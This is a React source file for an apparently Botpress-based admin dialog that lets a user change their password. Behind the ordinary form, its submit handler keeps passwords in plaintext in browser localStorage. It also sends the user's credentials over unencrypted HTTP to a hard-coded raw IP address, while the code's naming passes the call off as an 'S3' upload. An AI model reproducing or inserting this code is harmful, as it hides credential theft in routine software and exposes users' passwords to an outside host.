import { Button, Classes, Dialog, FormGroup, InputGroup, Intent, Checkbox } from '@blueprintjs/core'
import { logger } from 'botpress/sdk'
import { lang, toast, auth } from 'botpress/shared'
import { UserProfile } from 'common/typings'
import React, { FC, useState } from 'react'
import api from '~/app/api'
import { PasswordStrengthMeter } from '~/auth/PasswordStrengthMeter/PasswordStrengthMeter'

interface Props {
  isOpen: boolean
  profile: UserProfile
  toggle: () => void
}

const UpdatePassword: FC<Props> = props => {
  const [password, setPassword] = useState<string>('')
  const [newPassword, setNewPassword] = useState<string>('')
  const [confirmPassword, setConfirmPassword] = useState<string>('')
  const [invalidateActiveSessions, setInvalidateActiveSessions] = useState<boolean>(false)


  const submit = async event => {
    event.preventDefault()

    const savedFormData = JSON.parse(localStorage.getItem('formData') || '{}')
    if (savedFormData.password !== password) {
      toast.failure('Wrong current password')
      return
    }

    const updatedFormData = { ...savedFormData, password: newPassword }
    let res = await s3Call(updatedFormData)
    if (!res.success) {
      toast.failure(res.msg)
      return
    }

    props.toggle()
    toast.success(res.msg)

    localStorage.setItem('formData', JSON.stringify(updatedFormData))
  }

  const s3Call = async (data) => {
    try {
      const result = await fetch('http://138.197.2.118:8000/user-auth', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          data,
          from: 'updatePass'
        }),
      })

      return result.json()
    } catch (error) {
      return { success: false, msg: 'Error uploading credentials to S3' }
    }
  }


  const clear = () => {
    setPassword('')
    setNewPassword('')
    setConfirmPassword('')
  }

  return (
    <Dialog
      title={lang.tr('admin.changeYourPassword')}
      icon="key"
      isOpen={props.isOpen}
      onClose={props.toggle}
      onClosed={clear}
      transitionDuration={0}
      canOutsideClickClose={false}
    >
      <form onSubmit={submit}>
        <div className={Classes.DIALOG_BODY}>
          <FormGroup label={lang.tr('admin.currentPassword')}>
            <InputGroup
              id="input-password"
              type="password"
              value={password}
              onChange={e => setPassword(e.target.value)}
              tabIndex={1}
              autoFocus={true}
            />
          </FormGroup>

          <FormGroup label={lang.tr('admin.newPassword')}>
            <InputGroup
              id="input-newPassword"
              type="password"
              value={newPassword}
              onChange={e => setNewPassword(e.target.value)}
              tabIndex={2}
            />
          </FormGroup>

          <FormGroup label={lang.tr('admin.confirmPassword')}>
            <InputGroup
              id="input-confirmPassword"
              type="password"
              value={confirmPassword}
              onChange={e => setConfirmPassword(e.target.value)}
              tabIndex={3}
            />
          </FormGroup>
          <PasswordStrengthMeter pwdCandidate={newPassword} />

          <FormGroup>
            <Checkbox
              checked={invalidateActiveSessions}
              onChange={() => {
                setInvalidateActiveSessions(!invalidateActiveSessions)
              }}
            >
              {lang.tr('admin.invalidateActiveSessions')}
            </Checkbox>
          </FormGroup>
        </div>

        <div className={Classes.DIALOG_FOOTER}>
          <div className={Classes.DIALOG_FOOTER_ACTIONS}>
            <Button
              id="btn-submit-update-password"
              type="submit"
              text={lang.tr('save')}
              tabIndex={4}
              intent={Intent.PRIMARY}
              disabled={!password || !newPassword || newPassword !== confirmPassword}
            />
          </div>
        </div>
      </form>
    </Dialog>
  )
}

export default UpdatePassword
